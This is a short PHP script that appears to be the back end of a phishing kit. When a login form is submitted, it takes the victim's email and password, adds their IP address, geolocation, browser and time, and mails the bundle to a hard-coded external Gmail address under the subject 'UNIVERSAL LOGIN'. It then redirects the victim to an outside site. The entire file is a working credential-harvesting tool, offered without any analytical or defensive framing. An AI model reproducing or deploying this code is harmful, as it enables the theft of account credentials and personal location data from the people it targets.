<?php
ob_start();

function now() {
date_default_timezone_set('GMT');
return date("h:i:sa");
}
$url = md5($url);
$praga= password_hash($praga, PASSWORD_BCRYPT, array('cost' => 12));
if(isset($_POST['email'])&&isset($_POST['password'])){
require_once('./geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$email = $_POST['email'];
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "===============+ FRANK LOGS +===============\n";
$message .= "username: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "----------------------  [ IP Info ] ------------------\n";
$message .="IP:   {$geoplugin->ip}\n";
$message .="City:   {$geoplugin->city}\n";
$message .="Region:   {$geoplugin->region}\n";
$message .="Country Name:   {$geoplugin->countryName}\n";
$message .="Country Code:   {$geoplugin->countryCode}\n";
$message .="Latitude:   {$geoplugin->latitude}\n";
$message .="Longitude:   {$geoplugin->longitude}\n";
$message .="Currency Code:   {$geoplugin->currencyCode}\n";
$message .="Currency Symbol:   {$geoplugin->currencySymbol}\n";
$message .="Exchange Rate:   {$geoplugin->currencyConverter}\n";
$message .="User-Agent: ".$browser."\n";
$message .= "Date Log  : ".$date."\n";
$message .= "Time Log  : ".now()." GMT\n";
$message.= "==============++++ OSKIE ++++==============\n";

$domain = 'NEW UPDATED LINK';
$subj = "UNIVERSAL LOGIN : ($ip)";
$from = "From: $domain<west>\n";
mail("oladunkeadebola@gmail.com",$subj,$message,$from,$domain);
header("Location: https://cudalbapt.com/p/G2tIsg_g8xnI5vCEZUa3BFO8Trvb6xsOGSk*oEmhzEbFEcccNTbSesDaALnZelW60kJLv0vDm1Lnrua3SzCad30665eJzkJzlxLhr_jF*LVasqY6VPcrC_oT*z8VYYWYBAGWs9ZiOvwDqRY8rmDSrRmE8jY4lZlTnX0MglriMpXv2Ouc_lX_slkxDN1nusLCP60xinySCVyhXcEVXCwdyd2nPTdjrKJyRdDbFg_Ej99SeXbC9I26CCl9W3hqsv9vYuU4QvrSQ0xlCqS1B1GLU3grAhX95IWQHrzf9AWaTqs");
}else{
header("Location: https://cudalbapt.com/p/G2tIsg_g8xnI5vCEZUa3BFO8Trvb6xsOGSk*oEmhzEbFEcccNTbSesDaALnZelW60kJLv0vDm1Lnrua3SzCad30665eJzkJzlxLhr_jF*LVasqY6VPcrC_oT*z8VYYWYBAGWs9ZiOvwDqRY8rmDSrRmE8jY4lZlTnX0MglriMpXv2Ouc_lX_slkxDN1nusLCP60xinySCVyhXcEVXCwdyd2nPTdjrKJyRdDbFg_Ej99SeXbC9I26CCl9W3hqsv9vYuU4QvrSQ0xlCqS1B1GLU3grAhX95IWQHrzf9AWaTqs");
}
    